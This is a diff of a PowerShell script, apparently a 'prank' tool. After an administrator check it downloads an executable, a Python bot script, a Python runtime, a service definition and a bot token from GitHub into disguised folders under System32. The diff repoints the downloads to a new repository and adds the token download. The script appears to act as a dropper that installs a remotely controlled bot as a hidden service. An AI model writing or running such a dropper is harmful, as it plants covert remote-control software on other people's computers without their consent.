@@ -10,6 +10,7 @@ $destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
 $destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
 $destino5 = 'C:\Windows\System32\ap32\scripts.zip'
 $destino6 = 'C:\Windows\System32\Int-service.xml'
+$destino7 = 'C:\Windows\System32\ap32\token.txt'
 
 # --- CRIAÇÃO DO FICHEIRO vbs ---
 $vbsContent = @"
@@ -71,12 +72,13 @@ if (Test-IsAdmin) {
     New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
     New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory
 
-    Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/Int-service.exe?dl=1" -OutFile $destino
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/bot.py?dl=1" -OutFile $destino2
-    Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64.zip?dl=1" -OutFile $destino3
-    Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64_2.zip?dl=1" -OutFile $destino4
-    Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/scripts.zip?dl=1" -OutFile $destino5
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/Int-service.xml?dl=1" -OutFile $destino6
+    Invoke-WebRequest -Uri "https://github.com/katchupa-sabi/powershell_pranks/raw/refs/heads/main/Int-service.exe?dl=1" -OutFile $destino
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/bot.py?dl=1" -OutFile $destino2
+    Invoke-WebRequest -Uri "https://github.com/katchupa-sabi/powershell_pranks/raw/refs/heads/main/WPy64.zip?dl=1" -OutFile $destino3
+    Invoke-WebRequest -Uri "https://github.com/katchupa-sabi/powershell_pranks/raw/refs/heads/main/WPy64_2.zip?dl=1" -OutFile $destino4
+    Invoke-WebRequest -Uri "https://github.com/katchupa-sabi/powershell_pranks/raw/refs/heads/main/scripts.zip?dl=1" -OutFile $destino5
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/Int-service.xml?dl=1" -OutFile $destino6
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/token.txt?dl=1" -OutFile $destino7
 
     Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\re-as" -Force
     Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\re-as" -Force
